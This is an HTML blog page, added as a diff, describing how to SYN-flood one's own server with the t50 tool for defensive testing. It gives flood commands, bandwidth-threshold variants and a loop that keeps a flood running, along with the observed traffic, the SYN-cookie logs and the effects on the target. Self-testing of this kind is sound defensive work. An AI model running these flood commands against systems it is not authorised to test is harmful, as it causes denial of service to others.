@@ -1,0 +1,86 @@
+<!DOCTYPE html><html lang="en" data-astro-cid-4sn4zg3r> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Syn Flood Testing — timeline.523.life</title><meta name="description" content="Syn Flood Testing"><link rel="canonical" href="https://timeline.523.life/blog/Syn-Flood-Test"><style>:root{--bg: #0b0e13;--panel: #11161f;--text: #e7ecf3;--muted: #97a3b6;--accent: #6aa0ff}[data-astro-cid-4sn4zg3r]{box-sizing:border-box}html,body{margin:0;padding:0;background:var(--bg);color:var(--text);font:16px/1.6 system-ui,-apple-system,Segoe UI,Roboto,Ubuntu,Cantarell,Noto Sans,Helvetica Neue,Arial,"Apple Color Emoji","Segoe UI Emoji"}main[data-astro-cid-4sn4zg3r]{max-width:720px;margin:0 auto;padding:24px}.header[data-astro-cid-4sn4zg3r]{margin-bottom:40px}.back-link[data-astro-cid-4sn4zg3r]{color:var(--accent);text-decoration:none;font-size:14px}.back-link[data-astro-cid-4sn4zg3r]:hover{text-decoration:underline}.meta[data-astro-cid-4sn4zg3r]{font-size:14px;color:var(--muted);margin:16px 0 8px}.type[data-astro-cid-4sn4zg3r]{text-transform:uppercase;letter-spacing:.06em;font-size:12px}h1[data-astro-cid-4sn4zg3r]{margin:8px 0 24px;font-size:32px;line-height:1.2}.content[data-astro-cid-4sn4zg3r]{margin:32px 0}.content[data-astro-cid-4sn4zg3r] img[data-astro-cid-4sn4zg3r]{max-width:100%;height:auto;border-radius:8px}.content[data-astro-cid-4sn4zg3r] p[data-astro-cid-4sn4zg3r]{margin:16px 0}.content[data-astro-cid-4sn4zg3r] pre[data-astro-cid-4sn4zg3r]{background:#1a1f2e;padding:16px;border-radius:8px;overflow-x:auto}.content[data-astro-cid-4sn4zg3r] code[data-astro-cid-4sn4zg3r]{font-family:Monaco,Courier New,monospace;font-size:14px}.content[data-astro-cid-4sn4zg3r] a[data-astro-cid-4sn4zg3r]{color:var(--accent)}.post-footer[data-astro-cid-4sn4zg3r]{margin-top:48px;padding-top:24px;border-top:1px solid #1f2937;display:flex;justify-content:space-between;flex-wrap:wrap;gap:16px}@media (max-width: 640px){h1[data-astro-cid-4sn4zg3r]{font-size:24px}main[data-astro-cid-4sn4zg3r]{padding:16px}}
+</style></head> <body data-astro-cid-4sn4zg3r> <main data-astro-cid-4sn4zg3r> <header class="header" data-astro-cid-4sn4zg3r> <nav data-astro-cid-4sn4zg3r> <a href="/" class="back-link" data-astro-cid-4sn4zg3r>← Back to timeline</a> </nav> <div class="meta" data-astro-cid-4sn4zg3r> <span class="type" data-astro-cid-4sn4zg3r>blog</span> · <time datetime="2013-05-29T00:00:00.000Z" data-astro-cid-4sn4zg3r>5/28/2013</time> </div> <h1 data-astro-cid-4sn4zg3r>Syn Flood Testing</h1> </header> <article class="content" data-astro-cid-4sn4zg3r><p>Launching a SYN flood.</p>
+<p>Everyone know DDOS attacks happen and of these SYN floods may be the simplest to organize for attackers. As a defender you don&#39;t want the first time you see this kind of traffic to be when you are under attack.</p>
+<p>Launching a SYN attack against yourself.</p>
+<ol>
+<li>You can learn some tools of the trade</li>
+<li>You can test the weakness of your services</li>
+<li>You can mitigate those weaknesses</li>
+</ol>
+<p>A tool that is simple to use is <a href="https://github.com/foreni-packages/t50">t50</a></p>
+<h3>Launching a SYN Flood</h3>
+<blockquote>
+<p>./t50 <DEST_IP> --flood -S --turbo</p>
+</blockquote>
+<pre><code>entering in flood mode...
+activating turbo...
+hit CTRL+C to break.
+...
+T50 5.4.1 successfully launched on May 28th 2013 13:09:24
+</code></pre>
+<h3>On the destination [NOTE: SYN Cookies are enabled]</h3>
+<h4>Traffic</h4>
+<pre><code>    tx eth0: 1168 b/s rx eth0: 528 b/s
+    tx eth0: 1056 b/s rx eth0: 9160 b/s
+    tx eth0: 8616 b/s rx eth0: 528 b/s
+    tx eth0: 4944 b/s rx eth0: 528 b/s
+
+        *syn flood starts**
+
+    tx eth0: 10 Mb/s rx eth0: 12 Mb/s
+    tx eth0: 36 Mb/s rx eth0: 43 Mb/s
+    tx eth0: 38 Mb/s rx eth0: 46 Mb/s
+    tx eth0: 39 Mb/s rx eth0: 47 Mb/s
+    tx eth0: 39 Mb/s rx eth0: 47 Mb/s
+</code></pre>
+<pre><code>    possible SYN flooding on port 5666. Sending cookies.
+    possible SYN flooding on port 5666. Sending cookies.
+</code></pre>
+<h4>Connection Table</h4>
+<pre><code class="language-plaintext">   while true; do netstat -n -p TCP tcp | grep  SYN_RECV | wc -l &gt;&gt; /tmp/syn.log; sleep 2; done
+
+    0
+    5
+    6
+    3
+    2
+    ...
+    **syn flood**
+    ...
+    142
+    140
+    144
+    143
+    142
+    142
+    143
+    142
+    141
+    141
+    140
+    137
+    138
+    140
+    142
+    142
+    142
+    145
+    144
+</code></pre>
+<h4>Effect</h4>
+<ul>
+<li>Massive lag in responsiveness for CLI commands</li>
+<li>Simple web server with (python -m SimpleHTTPServer) crashed</li>
+<li>Top shows ksoftirqd/0 pegging CPU</li>
+</ul>
+<h3>Guidance on size of flood</h3>
+<pre><code class="language-plaintext">./t50 &lt;target&gt; --threshold 10000 -S #4Mbps
+./t50 &lt;target&gt; --threshold 20000 -S #8Mbps
+./t50 &lt;target&gt; --threshold 40000 -S #16Mbps
+
+#more or less consisten 4Mbps flood
+for i in {1..100}; do ./t50 &lt;target&gt; --threshold 10000 -S; sleep 3; done
+</code></pre>
+<h3>Reference</h3>
+<p><a href="https://github.com/foreni-packages/t50">t50</a></p>
+</article> <footer class="post-footer" data-astro-cid-4sn4zg3r> <a href="/" class="back-link" data-astro-cid-4sn4zg3r>← Back to timeline</a> <a href="/Blog/Syn-Flood-Test/" target="_blank" rel="noopener" data-astro-cid-4sn4zg3r>Original post ↗</a> </footer> </main> </body></html>
